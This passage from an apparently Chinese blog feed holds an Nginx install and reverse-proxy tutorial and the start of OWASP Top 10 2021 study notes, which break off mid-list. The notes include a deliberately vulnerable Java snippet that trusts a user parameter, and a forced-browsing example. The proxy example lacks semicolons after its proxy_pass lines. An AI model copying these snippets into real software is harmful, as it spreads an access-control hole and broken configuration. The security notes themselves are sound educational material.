    <content type="html"><![CDATA[<p>互联网冲浪的时候，感觉自己的一切言行都被打上了指纹，于是乎打算自己搞一个即时通讯工具玩的时候发现一个开源的即时通讯系统<a href="https://github.com/OpenIMSDK/Open-IM-Server">openIM</a>，搭建后端的时候发现可以用Nginx反向代理将流量转发到内网的不同主机上以实现负载均衡，瞬时感觉很神奇，接触到了之前不知道的东西，因此学习记录一下以备日后翻阅。</p><p><img src="/images/fj34.jpg"></p><span id="more"></span><h2 id="Nginx安装"><a href="#Nginx安装" class="headerlink" title="Nginx安装"></a>Nginx安装</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>阿里云免费领的ECS</p><p>操作系统：Ubuntu 18.04</p><h3 id="APT简易安装"><a href="#APT简易安装" class="headerlink" title="APT简易安装"></a>APT简易安装</h3><p>查看版本信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update<br>apt show nginx<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Package: nginx<br><span class="hljs-keyword">Version</span>: <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><br>Priority: optional<br>Section: web<br>Origin: Ubuntu<br>Maintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;<br>Original-Maintainer: Debian Nginx Maintainers &lt;pkg-nginx-maintainers@lists.alioth.debian.org&gt;<br>Bugs: https://bugs.launchpad.net/ubuntu/+filebug<br>Installed-Size: <span class="hljs-number">44.0</span> kB<br><span class="hljs-keyword">Depends</span>: nginx-core (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~) | nginx-<span class="hljs-keyword">full</span> (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~) | nginx-light (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~) | nginx-extras (&lt;&lt; <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span><span class="hljs-number">.1</span>~), nginx-core (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>) | nginx-<span class="hljs-keyword">full</span> (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>) | nginx-light (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>) | nginx-extras (&gt;= <span class="hljs-number">1.14</span><span class="hljs-number">.0</span><span class="hljs-number">-0</span>ubuntu1<span class="hljs-number">.10</span>)<br>Homepage: http://nginx.net<br>Supported: <span class="hljs-number">5</span>y<br>Download-Size: <span class="hljs-number">3</span>,<span class="hljs-number">596</span> B<br>APT-Sources: http://mirrors.cloud.aliyuncs.com/ubuntu bionic-updates/main amd64 Packages<br>Description: small, powerful, scalable web/proxy <span class="hljs-keyword">server</span><br> Nginx (&quot;engine X&quot;) <span class="hljs-keyword">is</span> a high-performance web <span class="hljs-keyword">and</span> <span class="hljs-keyword">reverse</span> proxy <span class="hljs-keyword">server</span><br> created <span class="hljs-keyword">by</span> Igor Sysoev. It can be used <span class="hljs-keyword">both</span> <span class="hljs-keyword">as</span> a standalone web <span class="hljs-keyword">server</span><br> <span class="hljs-keyword">and</span> <span class="hljs-keyword">as</span> a proxy <span class="hljs-keyword">to</span> reduce the <span class="hljs-keyword">load</span> <span class="hljs-keyword">on</span> back-<span class="hljs-keyword">end</span> HTTP <span class="hljs-keyword">or</span> mail servers.<br> .<br> This <span class="hljs-keyword">is</span> a dependency package <span class="hljs-keyword">to</span> install either nginx-<span class="hljs-keyword">full</span> (<span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>),<br> nginx-light <span class="hljs-keyword">or</span> nginx-extras.<br><br>N: There <span class="hljs-keyword">is</span> <span class="hljs-number">1</span> additional <span class="hljs-type">record</span>. Please use the <span class="hljs-string">&#x27;-a&#x27;</span> switch <span class="hljs-keyword">to</span> see it<br></code></pre></td></tr></table></figure><p>这里选择默认的nginx-full就可以，所以直接用<code>sudo apt-get install nginx</code>就是默认安装nginx-full</p><h3 id="安装目录说明"><a href="#安装目录说明" class="headerlink" title="安装目录说明"></a>安装目录说明</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>sbin/nginx：主程序，启动文件<br><span class="hljs-regexp">/etc/</span>nginx：存放配置文件<br><span class="hljs-regexp">/var/</span>www/html：存放项目目录<br><span class="hljs-regexp">/var/</span>log/nginx：存放日志  <br></code></pre></td></tr></table></figure><p>以上是通过apt默认安装的目录信息，可能随着版本不同有所变化</p><h3 id="nginx一些管理命令"><a href="#nginx一些管理命令" class="headerlink" title="nginx一些管理命令"></a>nginx一些管理命令</h3><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs protobuf"><span class="hljs-keyword">service </span><span class="hljs-title class_">nginx</span> start<br><span class="hljs-keyword">service </span><span class="hljs-title class_">nginx</span> restart<br><span class="hljs-keyword">service </span><span class="hljs-title class_">nginx</span> stop<br></code></pre></td></tr></table></figure><h2 id="Nginx反向代理"><a href="#Nginx反向代理" class="headerlink" title="Nginx反向代理"></a>Nginx反向代理</h2><h3 id="什么是反向代理"><a href="#什么是反向代理" class="headerlink" title="什么是反向代理"></a>什么是反向代理</h3><p>用过“科学上网”的都知道，代理服务器是个什么东西，简单的用下面这张图来解释吧：</p><p><img src="/images/proxy_yuanli.png"></p><p>防火墙会拦截我们的谷歌的请求，但是不会拦截我们访问代理服务器的请求，那么我们就可以通过代理服务器访问谷歌。</p><p>那么什么是<strong>反向代理</strong>呢？</p><p>如下图所示，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器 IP地址。</p><p><img src="/images/reproxy_yuanli.png"></p><h3 id="Nginx配置文件"><a href="#Nginx配置文件" class="headerlink" title="Nginx配置文件"></a>Nginx配置文件</h3><p>如果是使用apt默认安装的话，配置文件nginx.conf应该在<code>/etc/nginx/</code>目录下。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">user</span> www-data;<br><span class="hljs-attribute">worker_processes</span> auto;<br><span class="hljs-attribute">pid</span> /run/nginx.pid;<br><span class="hljs-attribute">include</span> /etc/nginx/modules-enabled/<span class="hljs-regexp">*.conf</span>;<br><br><span class="hljs-section">events</span> &#123;<br><span class="hljs-attribute">worker_connections</span> <span class="hljs-number">768</span>;<br><span class="hljs-comment"># multi_accept on;</span><br>&#125;<br><br><span class="hljs-section">http</span> &#123;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Basic Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nodelay</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">65</span>;<br><span class="hljs-attribute">types_hash_max_size</span> <span class="hljs-number">2048</span>;<br><span class="hljs-comment"># server_tokens off;</span><br><br><span class="hljs-comment"># server_names_hash_bucket_size 64;</span><br><span class="hljs-comment"># server_name_in_redirect off;</span><br><br><span class="hljs-attribute">include</span> /etc/nginx/mime.types;<br><span class="hljs-attribute">default_type</span> application/octet-stream;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># SSL Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>; <span class="hljs-comment"># Dropping SSLv3, ref: POODLE</span><br><span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Logging Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">access_log</span> /var/log/nginx/access.log;<br><span class="hljs-attribute">error_log</span> /var/log/nginx/<span class="hljs-literal">error</span>.log;<br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Gzip Settings</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-comment"># gzip_vary on;</span><br><span class="hljs-comment"># gzip_proxied any;</span><br><span class="hljs-comment"># gzip_comp_level 6;</span><br><span class="hljs-comment"># gzip_buffers 16 8k;</span><br><span class="hljs-comment"># gzip_http_version 1.1;</span><br><span class="hljs-comment"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># Virtual Host Configs</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-attribute">include</span> /etc/nginx/conf.d/<span class="hljs-regexp">*.conf</span>;<br><span class="hljs-attribute">include</span> /etc/nginx/sites-enabled/*;<br>&#125;<br><br><br><span class="hljs-comment">#mail &#123;</span><br><span class="hljs-comment">## See sample authentication script at:</span><br><span class="hljs-comment">## http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment">## auth_http localhost/auth.php;</span><br><span class="hljs-comment">## pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class="hljs-comment">## imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment">#server &#123;</span><br><span class="hljs-comment">#listen     localhost:110;</span><br><span class="hljs-comment">#protocol   pop3;</span><br><span class="hljs-comment">#proxy      on;</span><br><span class="hljs-comment">#&#125;</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment">#server &#123;</span><br><span class="hljs-comment">#listen     localhost:143;</span><br><span class="hljs-comment">#protocol   imap;</span><br><span class="hljs-comment">#proxy      on;</span><br><span class="hljs-comment">#&#125;</span><br><span class="hljs-comment">#&#125;</span><br></code></pre></td></tr></table></figure><p>上面是一份默认的配置文件，去除注释部分之后，整个配置文件大概可以分为三个部分。</p><h4 id="全局部分"><a href="#全局部分" class="headerlink" title="全局部分"></a>全局部分</h4><p>也就是最开始的部分，一直到events之前的部分，主要会设置一些影响<code>Nginx</code>服务器整体运行的配置指令，主要包括：配置运行Nginx服务器的用户（组）、允许生成的 <code>worker_process</code> 数，进程<code>PID</code>存放路径以及配置文件的引入等。<code>worker_process</code> 数是处理并发的关键配置，表示开启几个业务进程，值越大可以支持的并发处理数量越多，但是会受到设备限制。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">user www-data;<br>worker_processes auto;<br>pid <span class="hljs-regexp">/run/</span>nginx.pid;<br><span class="hljs-keyword">include</span> <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/modules-enabled/</span>*.conf;<br></code></pre></td></tr></table></figure><h4 id="events部分"><a href="#events部分" class="headerlink" title="events部分"></a>events部分</h4><p>配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</p><h4 id="http部分"><a href="#http部分" class="headerlink" title="http部分"></a>http部分</h4><p>可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</p><p><strong>server块</strong>：配置虚拟主机的相关参数，一个http中可以有多个server。</p><p><strong>location块</strong>：配置请求的路由，以及各种页面的处理情况，一个server块可以包含多个location。</p><p>下面配置指令参考<a href="https://www.runoob.com/w3cnote/nginx-setup-intro.html">Nginx 配置详解 | 菜鸟教程 (runoob.com)</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">########### 每个指令必须有分号结束。#################</span><br><span class="hljs-comment">#user administrator administrators;  #配置用户或者组，默认为nobody nobody。</span><br><span class="hljs-comment">#worker_processes 2;  #允许生成的进程数，默认为1</span><br><span class="hljs-comment">#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址</span><br><span class="hljs-attribute">error_log</span> log/<span class="hljs-literal">error</span>.log <span class="hljs-literal">debug</span>;  <span class="hljs-comment">#制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span><br><span class="hljs-section">events</span> &#123;<br>    <span class="hljs-attribute">accept_mutex</span> <span class="hljs-literal">on</span>;   <span class="hljs-comment">#设置网路连接序列化，防止惊群现象发生，默认为on</span><br>    <span class="hljs-attribute">multi_accept</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment">#设置一个进程是否同时接受多个网络连接，默认为off</span><br>    <span class="hljs-comment">#use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport</span><br>    <span class="hljs-attribute">worker_connections</span>  <span class="hljs-number">1024</span>;    <span class="hljs-comment">#最大连接数，默认为512</span><br>&#125;<br><span class="hljs-section">http</span> &#123;<br>    <span class="hljs-attribute">include</span>       mime.types;   <span class="hljs-comment">#文件扩展名与文件类型映射表</span><br>    <span class="hljs-attribute">default_type</span>  application/octet-stream; <span class="hljs-comment">#默认文件类型，默认为text/plain</span><br>    <span class="hljs-comment">#access_log off; #取消服务日志    </span><br>    <span class="hljs-attribute">log_format</span> myFormat <span class="hljs-string">&#x27;<span class="hljs-variable">$remote_addr</span>–<span class="hljs-variable">$remote_user</span> [<span class="hljs-variable">$time_local</span>] <span class="hljs-variable">$request</span> <span class="hljs-variable">$status</span> <span class="hljs-variable">$body_bytes_sent</span> <span class="hljs-variable">$http_referer</span> <span class="hljs-variable">$http_user_agent</span> <span class="hljs-variable">$http_x_forwarded_for</span>&#x27;</span>; <span class="hljs-comment">#自定义格式</span><br>    <span class="hljs-attribute">access_log</span> log/access.log myFormat;  <span class="hljs-comment">#combined为日志格式的默认值</span><br>    <span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;   <span class="hljs-comment">#允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。</span><br>    <span class="hljs-attribute">sendfile_max_chunk</span> <span class="hljs-number">100k</span>;  <span class="hljs-comment">#每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span><br>    <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">65</span>;  <span class="hljs-comment">#连接超时时间，默认为75s，可以在http，server，location块。</span><br><br>    <span class="hljs-section">upstream</span> mysvr &#123;   <br>      <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:7878</span>;<br>      <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.10.121:3333</span> backup;  <span class="hljs-comment">#热备</span><br>    &#125;<br>    <span class="hljs-attribute">error_page</span> <span class="hljs-number">404</span> https://www.baidu.com; <span class="hljs-comment">#错误页</span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">keepalive_requests</span> <span class="hljs-number">120</span>; <span class="hljs-comment">#单连接请求上限次数。</span><br>        <span class="hljs-attribute">listen</span>       <span class="hljs-number">4545</span>;   <span class="hljs-comment">#监听端口</span><br>        <span class="hljs-attribute">server_name</span>  <span class="hljs-number">127.0.0.1</span>;   <span class="hljs-comment">#监听地址       </span><br>        <span class="hljs-section">location</span>  ~*^.+$ &#123;       <span class="hljs-comment">#请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。</span><br>           <span class="hljs-comment">#root path;  #根目录</span><br>           <span class="hljs-comment">#index vv.txt;  #设置默认页</span><br>           <span class="hljs-attribute">proxy_pass</span>  http://mysvr;  <span class="hljs-comment">#请求转向mysvr 定义的服务器列表</span><br>           <span class="hljs-attribute">deny</span> <span class="hljs-number">127.0.0.1</span>;  <span class="hljs-comment">#拒绝的ip</span><br>           <span class="hljs-attribute">allow</span> <span class="hljs-number">172.18.5.54</span>; <span class="hljs-comment">#允许的ip           </span><br>        &#125; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Nginx配置反向代理"><a href="#Nginx配置反向代理" class="headerlink" title="Nginx配置反向代理"></a>Nginx配置反向代理</h3><p>实现效果：使用Nginx反向代理，根据访问的路径跳转到不同端口服务中，Nginx监听端口为80</p><ul><li>访问<a href="http://47.x.x.x/test1/%E8%B7%B3%E8%BD%AC%E5%88%B0192.168.1.1:8080">http://47.x.x.x/test1/跳转到192.168.1.1:8080</a></li><li>访问<a href="http://47.x.x.x/test2/%E8%B7%B3%E8%BD%AC%E5%88%B0192.168.1.2:8080">http://47.x.x.x/test2/跳转到192.168.1.2:8080</a></li></ul><p>修改Nginx配置文件：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span>  <span class="hljs-number">47</span>.x.x.x;<br><br><span class="hljs-section">location</span> <span class="hljs-regexp">~ /test1/</span> &#123;<br><span class="hljs-attribute">proxy_pass</span>  http://192.168.1.1:8080<br>&#125;<br><br>location <span class="hljs-regexp">~ /test2/</span> &#123;<br><span class="hljs-attribute">proxy_pass</span>  http://192.168.1.2:8080<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据上面的配置，当请求到达 Nginx 反向代理服务器时，会根据请求路径不同进行分发到不同的服务上。</p><h4 id="location匹配说明"><a href="#location匹配说明" class="headerlink" title="location匹配说明"></a>location匹配说明</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> [ = | <span class="hljs-regexp">~ |</span> <span class="hljs-regexp">~* |</span><span class="hljs-regexp"> ^~]</span> uri &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">= ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配，如果匹配成功，就停止继续向下搜索并立即处理该请求</span><br>~：用于表示 uri 包含正则表达式，并且区分大小写<br>~*：用于表示 uri 包含正则表达式，并且不区分大小写<br>^~：用于不含正则表达式的 uri 前，要求 Nginx 服务器找到标识 uri 和请求。字符串匹配度最高的 location 后，立即使用此 location 处理请求，而不再使用 location块中的正则 uri 和请求字符串做匹配。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>后端</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASP Top 10 for 2021 学习笔记（上）</title>
    <link href="/blog/2022/10/13/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/blog/2022/10/13/OWASP-Top-10-for-2021-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>最近一直在做的这个逻辑漏洞检测的项目，检测的漏洞类型多数都属于OWASP TOP 10，以后计划做安全开发，有必要学习一下最新的OWASP Top10 漏洞原理与防御技术。</strong></p><p><img src="/images/fj23.jpg"></p><span id="more"></span><h2 id="2021年最新版本的相较于2017年版本的变化"><a href="#2021年最新版本的相较于2017年版本的变化" class="headerlink" title="2021年最新版本的相较于2017年版本的变化"></a>2021年最新版本的相较于2017年版本的变化</h2><p>最新的OWASP Top 10相较于上一个版本有三个全新的分类，分别是：</p><ul><li>A04：不安全的设计</li><li>A08：软件和数据完整性失效</li><li>A10：SSRF服务器端请求伪造</li></ul><p>除此之外还有四个分类做了名称范围修正，并将有些类合并为一个类，如下图所示：</p><p><img src="/images/owasp2021.png"></p><h2 id="A01-权限控制失效"><a href="#A01-权限控制失效" class="headerlink" title="A01 权限控制失效"></a>A01 权限控制失效</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>从2017年的第五名晋升至2021年的第一名，94%的被测试的应用中都有被检测到某种类别权限控制失效的问题。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200：向未经授权的行为者泄露敏感信息</a>：产品将敏感信息公开给未明确授权访问该信息的执行组件</li><li><a href="https://cwe.mitre.org/data/definitions/201.html">CWE-201：在发送的数据中插入敏感信息</a>：代码将数据传输到另一个执行组件，但部分数据包含该执行组件不应访问的敏感信息</li><li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352： 跨站点请求伪造</a>：Web 应用程序不会或无法充分验证提交请求的用户是否有意提供格式良好、有效且一致的请求</li></ul><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>存取控制强化策略，使用户不能采取在预期权限之外的行动。控制失效通常会导致未经授权的数据泄漏、修改或损坏所有数据，或执行超出用户权限的业务功能。常见的权限控制弱点包括：</p><ul><li>通过修改 URL、內部应用状态或 HTML 页面，或仅使用自定义 API 攻击工具来绕过存取控制检查。</li><li>允许主键被更改为其他用户的记录，允许查看或者编辑其他人员的账户。</li><li>特权提升。未登录用户拥有和登录用户权限，或者以用户身份登录拥有管理员权限。</li><li>元数据操作，例如重放或者篡改JSON 网站令牌(JWT)来存取控制令牌，或被操纵以提升特权或滥用 JWT 失效的 cookie 或隐藏域内容。</li><li><strong>CORS（跨域资源共享）</strong>错误配置允许未经授权的 API 存取。补充CORS是如何工作的：同源策略告诉浏览器阻止跨源请求。当你想从不同的源获取公共资源时，资源提供服务器需要告诉浏览器“请求来自的这个源可以访问我的资源”。浏览器记住这一点并允许跨源资源共享。<a href="https://zhuanlan.zhihu.com/p/414034535">CORS原理及解决办法</a></li><li>以未经身份验证的用户身份强制浏览已验证的页面或以标准用户身份存取特权页面。存取缺少存取控制的 API 以进行 POST、PUT 和 DELETE 操作。</li></ul><h3 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h3><p>存取控制仅在受信任的服务端代码或Serve-less API有效，攻击者无法修改这里的存取控制检查或元数据，比如：</p><ul><li>除公开资源外，默认为拒绝存取</li><li>一次性地建置存取控制机制，之后在整个应用中重复使用这些机制，包括最大限度地减少使用CORS。</li><li>存取控制措施应该强化记录所有权，而不是让用户可以创建、读取、更新或删除任何记录。</li><li>独特的应用程序业务限制需求应该由<strong>域模型（Domain model）</strong>强制执行。补充领域模型：领域模型是一个抽象系统，它描述了知识领域、影响力或活动的选定方面。该模型可以用来解决与该领域相关的问题。领域模型是与需要在软件中建模的领域相关的有意义的现实概念的表示。这些概念包括业务涉及的数据以及业务使用的与该数据相关的规则。（来自维基百科）</li><li>停用 Web 服务器目录列表，并确保档案元数据（例如，.git)和备份档案不在 web 根目录中。</li><li>记录访问控制失效，并在适当的情况下提醒管理员。</li><li>对 API 和控制器存取进行流量限制，以最小化自动攻击工具所带来的的损害。</li><li>JWT令牌登出后，在服务器端应该使其失效。</li></ul><p>开发人员和QA人员应该包括功能访问控制单元和集成测试。</p><h3 id="攻击情景实例"><a href="#攻击情景实例" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>情境 #1：</strong> 应用程序在存取账户资料的 SQL 查询中使用未经验证的资料：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">pstmt.set<span class="hljs-constructor">String(1, <span class="hljs-params">request</span>.<span class="hljs-params">getParameter</span>(<span class="hljs-string">&quot;user&quot;</span>)</span>);<br><br>ResultSet results = pstmt.execute<span class="hljs-constructor">Query( )</span>;<br></code></pre></td></tr></table></figure><p>攻击者只需修改浏览器的“user”参数即可发送他们想要的任何账号。如果没有正确验证，攻击者可以存取任何用户的账户资料。</p><p><strong>情境 #2：</strong>攻击者强迫浏览某些目标网址，存取管理页面需要管理员权限。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/app/g</span>etappInfo<br><br>https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/app/</span>admin_getappInfo<br></code></pre></td></tr></table></figure><p>如果未经身份验证的用户可以访问任一仅能身份验证过用户才能访问页面，那就是一个缺陷。 如果一个非管理员可以访问管理页面，这也是一个缺陷。</p><h2 id="A02-加密机制失效"><a href="#A02-加密机制失效" class="headerlink" title="A02 加密机制失效"></a>A02 加密机制失效</h2><h3 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h3><p>从2017年的第三名变为第二名，之前版本称为“敏感资料泄露”，更像是一种广泛的症状而不是根本原因，本版本聚焦于密码学相关的失效（或者缺乏加密），并因此常常导致敏感资料的泄露。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/259.html">CWE-259：使用硬编码密码</a>：软件包含一个硬编码的密码，它将其用于自己的入站身份验证或与外部组件的出站通信。</li><li><a 